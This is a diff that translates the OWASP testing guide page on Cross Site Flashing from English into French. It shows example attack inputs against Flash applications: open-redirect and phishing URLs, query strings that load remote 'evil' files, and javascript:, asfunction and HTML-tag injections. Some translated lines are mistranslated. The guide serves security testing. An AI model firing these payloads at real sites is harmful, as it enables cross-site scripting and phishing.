@@ -1,81 +1,81 @@
-# Testing for Cross Site Flashing
+# Test du clignotement intersite
 
 |ID          |
 |------------|
 |WSTG-CLNT-08|
 
-## Summary
+## Sommaire
 
-ActionScript, based on ECMAScript, is the language used by Flash applications when dealing with interactive needs. There are three versions of the ActionScript language. ActionScript 1.0 and ActionScript 2.0 are very similar with ActionScript 2.0 being an extension of ActionScript 1.0. ActionScript 3.0, introduced with Flash Player 9, is a rewrite of the language to support object orientated design.
+ActionScript, basé sur ECMAScript, est le langage utilisé par les applications Flash pour répondre à des besoins interactifs. Il existe trois versions du langage ActionScript. ActionScript 1.0 et ActionScript 2.0 sont très similaires, ActionScript 2.0 étant une extension d'ActionScript 1.0. ActionScript 3.0, introduit avec Flash Player 9, est une réécriture du langage pour prendre en charge la conception orientée objet.
 
-ActionScript, like every other language, has some implementation patterns which could lead to security issues. In particular, since Flash applications are often embedded in browsers, vulnerabilities like DOM-based Cross Site Scripting (DOM XSS) could be present in flawed Flash applications.
+ActionScript, comme tous les autres langages, a des modèles d'implémentation qui peuvent entraîner des problèmes de sécurité. En particulier, étant donné que les applications Flash sont souvent intégrées dans les navigateurs, des vulnérabilités telles que le Cross Site Scripting (DOM XSS) basé sur DOM pourraient être présentes dans les applications Flash défectueuses.
 
-Cross-Site Flashing (XSF) is a vulnerability that has a similar impact to XSS.
+Cross-Site Flashing (XSF) est une vulnérabilité qui a un impact similaire à XSS.
 
-XSF occurs when the following scenarios are initiated from different domains:
+XSF se produit lorsque les scénarios suivants sont lancés à partir de différents domaines :
 
-- One movie loads another movie with `loadMovie*` functions (or other hacks) and has access to the same sandbox, or part of it.
-- An HTML page uses JavaScript to command an Adobe Flash movie, for example, by calling:
-    - `GetVariable` to access Flash public and static objects from JavaScript as a string.
-    - `SetVariable` to set a static or public Flash object to a new string value with JavaScript.
-- Unexpected communications between the browser and SWF application, which could result in stealing data from the SWF application.
+- Un film charge un autre film avec les fonctions `loadMovie*` (ou d'autres hacks) et a accès au même bac à sable, ou à une partie de celui-ci.
+- Une page HTML utilise JavaScript pour commander une animation Adobe Flash, par exemple en appelant :
+    - `GetVariable` pour accéder aux objets publics et statiques Flash à partir de JavaScript sous forme de chaîne.
+    - `SetVariable` pour définir un objet Flash statique ou public sur une nouvelle valeur de chaîne avec JavaScript.
+- Communications inattendues entre le navigateur et l'application SWF, pouvant entraîner le vol de données de l'application SWF.
 
-XSF may be performed by forcing a flawed SWF to load an external evil Flash file. This attack could result in XSS or in the modification of the GUI in order to fool a user to insert credentials on a fake Flash form. XSF could be used in the presence of Flash HTML Injection or external SWF files when `loadMovie*` methods are used.
+XSF peut être exécuté en forçant un fichier SWF défectueux à charger un fichier Flash externe malveillant. Cette attaque pourrait entraîner XSS ou la modification de l'interface graphique afin de tromper un utilisateur pour qu'il insère des informations d'identification sur un faux formulaire Flash. XSF peut être utilisé en présence de Flash HTML Injection ou de fichiers SWF externes lorsque les méthodes `loadMovie*` sont utilisées.
 
-### Open Redirectors
+### Ouvrir les redirecteurs
 
-SWFs have the capability to navigate the browser. If the SWF takes the destination in as a FlashVar, then the SWF may be used as an open redirector. An open redirector is any piece of website functionality on a trusted website that an attacker can use to redirect the end user to a malicious website. These are frequently used within phishing attacks. Similar to cross-site scripting, the attack involves a user clicking on a malicious link.
+Les SWF ont la capacité de naviguer dans le navigateur. Si le SWF prend la destination en tant que FlashVar, alors le SWF peut être utilisé comme redirecteur ouvert. Un redirecteur ouvert est toute fonctionnalité de site Web sur un site Web de confiance qu'un attaquant peut utiliser pour rediriger l'utilisateur final vers un site Web malveillant. Ceux-ci sont fréquemment utilisés dans les attaques de phishing. Semblable au cross-site scripting, l'attaque implique qu'un utilisateur clique sur un lien malveillant.
 
-In the Flash case, the malicious URL might look like:
+Dans le cas de Flash, l'URL malveillante pourrait ressembler à :
 
 ```text
-http://trusted.example.org/trusted.swf?getURLValue=http://www.evil-spoofing-website.org/phishEndUsers.html
+http://trusted.exemple.org/trusted.swf?getURLValue=http://www.evil-spoofing-website.org/phishEndUsers.html
 ```
 
-In the above example, an end user might see that the URL begins with their favorite trusted website and click on it. The link would load the trusted SWF which takes the `getURLValue` and provides it to an ActionScript browser navigation call:
+Dans l'exemple ci-dessus, un utilisateur final peut voir que l'URL commence par son site Web de confiance préféré et cliquer dessus. Le lien chargerait le fichier SWF de confiance qui prend `getURLValue` et le fournit à un appel de navigation du navigateur ActionScript :
 
 ```actionscript
 getURL(_root.getURLValue,"_self");
 ```
 
-This would navigate the browser to the malicious URL provided by the attacker. At this point, the phisher has successfully leveraged the trust the user has in trusted.example.org to trick the user into visiting their malicious website. From there, they could launch a 0-day, conduct spoofing of the original website, or any other type of attack. SWFs may unintentionally be acting as an open-redirector on the website.
+Cela dirigerait le navigateur vers l'URL malveillante fournie par l'attaquant. À ce stade, l'hameçonneur a réussi à tirer parti de la confiance que l'utilisateur a en trust.exemple.org pour inciter l'utilisateur à visiter son site Web malveillant. À partir de là, ils pourraient lancer un 0-day, effectuer une usurpation du site Web d'origine ou tout autre type d'attaque. Les fonds souverains peuvent involontairement agir comme un redirecteur ouvert sur le site Web.
 
-Developers should avoid taking full URLs as FlashVars. If they only plan to navigate within their own website, then they should use relative URLs or verify that the URL begins with a trusted domain and protocol.
+Les développeurs doivent éviter de prendre des URL complètes comme FlashVars. S'ils prévoient uniquement de naviguer sur leur propre site Web, ils doivent utiliser des URL relatives ou vérifier que l'URL commence par un domaine et un protocole de confiance.
 
-### Attacks and Flash Player Version
+### Attaques et version Flash Player
 
-Since May 2007, three new versions of Flash Player were released by Adobe. Every new version restricts some of the attacks previously described.
+Depuis mai 2007, trois nouvelles versions de Flash Player ont été publiées par Adobe. Chaque nouvelle version restreint certaines des attaques décrites précédemment.
 
-| Player Version | `asfunction` | ExternalInterface | GetURL | HTML Injection |
-|----------------|--------------|-------------------|--------|----------------|
-| v9.0 r47/48    |  Yes         |   Yes             | Yes    |     Yes        |
-| v9.0 r115      |  No          |   Yes             | Yes    |     Yes        |
-| v9.0 r124      |  No          |   Yes             | Yes    |     Partially  |
+| Version lecteur | `asfonction` | InterfaceExterne | GetURL | Injection HTML |
+|-----------------|--------------|------------------|--------|----------------|
+| v9.0 r47/48     |  Yes         |   Yes            | Yes    |     Yes        |
+| v9.0 r115       |  No          |   Yes            | Yes    |     Yes        |
+| v9.0 r124       |  No          |   Yes            | Yes    |     Partially  |
 
-## Test Objectives
+## Objectifs des tests
 
-- Decompile and analyze the application's code.
-- Assess sinks inputs and unsafe method usages.
+- Décompiler et analyser le code de l'application.
+- Évaluer les entrées de puits et les utilisations de méthodes non sûres.
 
-## How to Test
+## Comment tester
 
-Since the first publication of [Testing Flash Applications](http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf), new versions of Flash Player were released in order to mitigate some of the attacks which will be described. Nevertheless, some issues still remain exploitable because they are the result of insecure programming practices.
+Depuis la première publication de [Testing Flash Applications](http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf), de nouvelles versions de Flash Player ont été publiées afin d'atténuer certaines des attaques qui seront décrites. Néanmoins, certains problèmes restent encore exploitables car ils résultent de pratiques de programmation non sécurisées.
 
-### Decompilation
+### Décompilation
 
-Since SWF files are interpreted by a virtual machine embedded in the player itself, they can be potentially decompiled and analyzed. The most known and free ActionScript 2.0 decompiler is flare.
+Étant donné que les fichiers SWF sont interprétés par une machine virtuelle intégrée au lecteur lui-même, ils peuvent être potentiellement décompilés et analysés. Flare est le décompilateur ActionScript 2.0 le plus connu et le plus gratuit.
 
-To decompile a SWF file with flare just type:
+Pour décompiler un fichier SWF avec flare, tapez simplement :
 
 `$ flare hello.swf`
 
-This results in a new file called hello.flr.
+Cela se traduit par un nouveau fichier appelé hello.flr.
 
-Decompilation helps testers because it allows for white-box testing of the Flash applications. A quick web search can lead you to various disassemblers and flash security tools.
+La décompilation aide les testeurs car elle permet de tester en boîte blanche les applications Flash. Une recherche rapide sur le Web peut vous mener à divers désassembleurs et outils de sécurité flash.
 
-### Undefined Variables FlashVars
+### Variables non définies FlashVars
 
-FlashVars are the variables that the SWF developer planned on receiving from the web page. FlashVars are typically passed in from the Object or Embed tag within the HTML. For instance:
+Les FlashVars sont les variables que le développeur SWF prévoyait de recevoir de la page Web. Les FlashVars sont généralement transmises à partir de la balise Object ou Embed dans le code HTML. Par exemple:
 
 ```html
 <object width="550" height="400" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
@@ -87,11 +87,11 @@ codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#ve
 </object>
 ```
 
-FlashVars can also be initialized from the URL:
+Les FlashVars peuvent également être initialisées à partir de l'URL :
 
-`http://www.example.org/somefilename.swf?var1=val1&var2=val2`
+`http://www.exemple.org/somefilename.swf?var1=val1&var2=val2`
 
-In ActionScript 3.0, a developer must explicitly assign the FlashVar values to local variables. Typically, this looks like:
+Dans ActionScript 3.0, un développeur doit affecter explicitement les valeurs FlashVar aux variables locales. Typiquement, cela ressemble à :
 
 ```actionscript
 var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;
@@ -99,13 +99,13 @@ var var1:String = String(paramObj["var1"]);
 var var2:String = String(paramObj["var2"]);
 ```
 
-In ActionScript 2.0, any uninitialized global variable is assumed to be a FlashVar. Global variables are those variables that are prepended by `_root`, `_global` or `_level0`. This means that if an attribute like `_root.varname` is undefined throughout the code flow, it could be overwritten by URL parameters:
+Dans ActionScript 2.0, toute variable globale non initialisée est supposée être une FlashVar. Les variables globales sont les variables précédées de `_root`, `_global` ou `_level0`. Cela signifie que si un attribut tel que `_root.varname` n'est pas défini tout au long du flux de code, il peut être écrasé par les paramètres d'URL :
 
 `http://victim/file.swf?varname=value`
 
-Regardless of whether you are looking at ActionScript 2.0 or ActionScript 3.0, FlashVars can be a vector of attack. Let's look at some ActionScript 2.0 code that is vulnerable:
+Que vous regardiez ActionScript 2.0 ou ActionScript 3.0, FlashVars peut être un vecteur d'attaque. Examinons un code ActionScript 2.0 vulnérable :
 
-Example:
+exemple:
 
 ```actionscript
 movieClip 328 __Packages.Locale {
@@ -135,15 +135,15 @@ movieClip 328 __Packages.Locale {
     };
 ```
 
-The above code could be attacked by requesting:
+Le code ci-dessus pourrait être attaqué en demandant :
 
-`http://victim/file.swf?language=http://evil.example.org/malicious.xml?`
+`http://victim/file.swf?language=http://evil.exemple.org/malicious.xml?`
 
-### Unsafe Methods
+### Méthodes dangereuses
 
-When an entry point is identified, the data it represents could be used by unsafe methods. If the data is not filtered or validated, it could lead to some vulnerabilities.
+Lorsqu'un point d'entrée est identifié, les données qu'il représente peuvent être utilisées par des méthodes non sûres. Si les données ne sont pas filtrées ou validées, cela pourrait entraîner certaines vulnérabilités.
 
-Unsafe Methods since version r47 are:
+Les méthodes non sûres depuis la version r47 sont :
 
 - `loadVariables()`
 - `loadMovie()`
@@ -160,118 +160,118 @@ Unsafe Methods since version r47 are:
 - `flash.external.ExternalInterface.call(_root.callback)`
 - `htmlText`
 
-### Exploitation by Reflected XSS
+### Exploitation par XSS réfléchi
 
-The swf file should be hosted on the victim's host, and the techniques of reflected XSS must be used. An attacker forces the browser to load a pure swf file directly in the location bar (by redirection or social engineering) or by loading it through an iframe from an evil page:
+Le fichier swf doit être hébergé sur l'hôte de la victime, et les techniques de XSS réfléchi doivent être utilisées. Un attaquant force le navigateur à charger un fichier swf pur directement dans la barre d'adresse (par redirection ou ingénierie sociale) ou en le chargeant via une iframe depuis une page malveillante :
 
 ```html
 <iframe src='http://victim/path/to/file.swf'></iframe>
 ```
 
-In this situation, the browser will self-generate an HTML page as if it were hosted by the victim host.
+Dans cette situation, le navigateur générera automatiquement une page HTML comme si elle était hébergée par l'hôte victime.
 
-### GetURL (AS2) / NavigateToURL (AS3)
+### GetURL (AS2) / NavigateToURL (AS3)
 
-The GetURL function in ActionScript 2.0 and NavigateToURL in ActionScript 3.0 lets the movie load a URI into the browser's window. If an undefined variable is used as the first argument for getURL:
+La fonction GetURL dans ActionScript 2.0 et NavigateToURL dans ActionScript 3.0 permettent à l'animation de charger un URI dans la fenêtre du navigateur. Si une variable indéfinie est utilisée comme premier argument pour getURL :
 
 `getURL(_root.URI,'_targetFrame');`
 
-Or if a FlashVar is used as the parameter that is passed to a navigateToURL function:
+Ou si une FlashVar est utilisée comme paramètre passé à une fonctionnavigationToURL :
 
 ```actionscript
 var request:URLRequest = new URLRequest(FlashVarSuppliedURL);
 navigateToURL(request);
 ```
 
-Then this will mean it's possible to call JavaScript in the same domain where the movie is hosted by requesting:
+Cela signifie alors qu'il est possible d'appeler JavaScript dans le même domaine où le film est hébergé en demandant :
 
 `http://victim/file.swf?URI=javascript:evilcode`
 
 `getURL('javascript:evilcode','_self');`
 
-The same is possible when only some part of `getURL` is controlled via DOM injection with Flash JavaScript injection:
+La même chose est possible lorsque seule une partie de `getURL` est contrôlée via l'injection DOM avec l'injection Flash JavaScript :
 
 ```js
 getUrl('javascript:function('+_root.arg+')')
 ```
 
-### Using `asfunction`
+### Utilisation de `asfunction`
 
-You can use the special `asfunction` protocol to cause the link to execute an ActionScript function in a SWF file instead of opening a URL. Until release Flash Player 9 r48 `asfunction` could be used on every method which has a URL as an argument. After that release, `asfunction` was restricted to use within an HTML TextField.
+Vous pouvez utiliser le protocole spécial `asfunction` pour que le lien exécute une fonction ActionScript dans un fichier SWF au lieu d'ouvrir une URL. Jusqu'à la sortie de Flash Player 9 r48, `asfunction` pouvait être utilisé sur toutes les méthodes ayant une URL comme argument. Après cette version, `asfunction` a été limité à une utilisation dans un HTML TextField.
 
-This means that a tester could try to inject:
+Cela signifie qu'un testeur pourrait essayer d'injecter :
 
 ```actionscript
 asfunction:getURL,javascript:evilcode
 ```
 
-in every unsafe method, such as:
+dans toutes les méthodes dangereuses, telles que :
 
 ```actionscript
 loadMovie(_root.URL)
 ```
 
-by requesting:
+en demandant :
 
 `http://victim/file.swf?URL=asfunction:getURL,javascript:evilcode`
 
-### ExternalInterface
+### Interface externe
 
-`ExternalInterface.call` is a static method introduced by Adobe to improve player/browser interaction for both ActionScript 2.0 and ActionScript 3.0.
+`ExternalInterface.call` est une méthode statique introduite par Adobe pour améliorer l'interaction lecteur/navigateur pour ActionScript 2.0 et ActionScript 3.0.
 
-From a security point of view it could be abused when part of its argument could be controlled:
+D'un point de vue sécurité, il pourrait être abusé lorsqu'une partie de son argument pourrait être contrôlée :
 
 ```actionscript
 flash.external.ExternalInterface.call(_root.callback);
 ```
 
-the attack pattern for this kind of flaw may be something like the following:
+le modèle d'attaque pour ce type de faille peut ressembler à ce qui suit :
 
 ```js
 eval(evilcode)
 ```
 
-since the internal JavaScript that is executed by the browser will be something similar to:
+puisque le JavaScript interne exécuté par le navigateur ressemblera à :
 
 ```js
 eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "<undefined/>"; }')
 ```
 
-### HTML Injection
+### Injection HTML
 
-TextField Objects can render minimal HTML by setting:
+Les objets TextField peuvent restituer un code HTML minimal en définissant :
 
 ```actionscript
 tf.html = true
 tf.htmlText = '<tag>text</tag>'
 ```
 
-So if some part of text could be controlled by the tester, an `<a>` tag or an image tag could be injected resulting in modifying the GUI or a XSS attack on the browser.
+Ainsi, si une partie du texte pouvait être contrôlée par le testeur, une balise `<a>` ou une balise d'image pourrait être injectée, entraînant une modification de l'interface graphique ou une attaque XSS sur le navigateur.
 
-Some attack examples with `<a>` tag:
+Quelques exemples d'attaques avec le tag `<a>` :
 
-- Direct XSS: `<a href='javascript:alert(123)'>`
-- Call a function: `<a href='asfunction:function,arg'>`
-- Call SWF public functions: `<a href='asfunction:_root.obj.function, arg'>`
-- Call native static as function: `<a href='asfunction:System.Security.allowDomain,evilhost'>`
+- XSS direct : `<a href='javascript:alert(123)'>`
+- Appeler une fonction : `<a href='asfunction:function,arg'>`
+- Appelez les fonctions publiques SWF : `<a href='asfunction:_root.obj.function, arg'>`
+- Appel statique natif en tant que fonction : `<a href='asfunction:System.Security.allowDomain,evilhost'>`
 
-An image tag could be used as well:
+Une balise d'image pourrait également être utilisée :
 
 ```html
 <img src='http://evil/evil.swf'>
 ```
 
-In this example, `.swf` is necessary to bypass the Flash Player internal filter:
+Dans cet exemple, `.swf` est nécessaire pour contourner le filtre interne de Flash Player :
 
 ```html
 <img src='javascript:evilcode//.swf'>
 ```
 
-Since the release of Flash Player 9.0.124.0, XSS is no longer exploitable, but GUI modification could still be accomplished.
+Depuis la sortie de Flash Player 9.0.124.0, XSS n'est plus exploitable, mais la modification de l'interface graphique peut toujours être effectuée.
 
-The following tools may be helpful in working with SWF:
+Les outils suivants peuvent être utiles pour travailler avec SWF :
 
 - [OWASP SWFIntruder](https://wiki.owasp.org/index.php/Category:SWFIntruder)
-- [Decompiler – Flare](http://www.nowrap.de/flare.html)
-- [Disassembler – Flasm](http://flasm.sourceforge.net/)
-- [Swfmill – Convert Swf to XML and vice versa](https://www.swfmill.org/)
+- [Décompilateur - Flare](http://www.nowrap.de/flare.html)
+- [Désassembleur – Flasm](http://flasm.sourceforge.net/)
+- [Swfmill - Convertir Swf en XML et vice versa](https://www.swfmill.org/)
